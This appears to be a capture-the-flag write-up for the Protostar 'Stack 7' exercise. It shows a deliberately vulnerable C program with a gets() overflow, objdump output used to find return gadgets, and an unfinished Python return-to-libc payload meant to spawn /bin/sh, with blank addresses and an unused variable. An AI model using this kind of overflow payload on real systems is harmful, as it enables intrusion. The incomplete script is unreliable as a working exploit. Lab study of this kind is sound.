# Stack 7

## About

Stack6 introduces return to .text to gain code execution.

The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.

``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
    unsigned int ret;
	
	  printf("input path please: "); fflush(stdout);
	  
	    gets(buffer);
		
		  ret = __builtin_return_address(0);
		  
		    if((ret & 0xb0000000) == 0xb0000000) {
			      printf("bzzzt (%p)\n", ret);
				        _exit(1);
						  }
						  
						    printf("got path %s\n", buffer);
							  return strdup(buffer);
							  }
							  
							  int main(int argc, char **argv)
							  {
							    getpath();
								
								
								
								}
								
```

## Solution 

Using objdump to check for suitable calls in the .text segment

``` bash
[root:/opt/Data/stack7]# objdump -d ./stack7 -j .text | grep ret
 8048494:       c3                      ret
  80484c2:       c3                      ret
   8048544:       c3                      ret
    8048553:       c3                      ret
	 8048564:       c3                      ret
	  80485c9:       c3                      ret
	   80485cd:       c3                      ret
	    80485f9:       c3                      ret
```

any of these addresses will do, and i'd alter the previous exploit like so

``` python
#!/usr/bin/env python

offset = 80
shell = '/bin/sh;#'
junk = 'A' * (offset - len(shell))

systemaddr =
systemarg = 

textret = '\xc2\x84\x04\x08'

exitaddr =
exitarg = '\xff\xff\xff\xff'

payload = shell + junk + systemaddr + exitaddr + systemarg

print(payload)
```

however i still wont be able to execute `/bin/sh` from my `libc` so fo now i'll keep this as a template
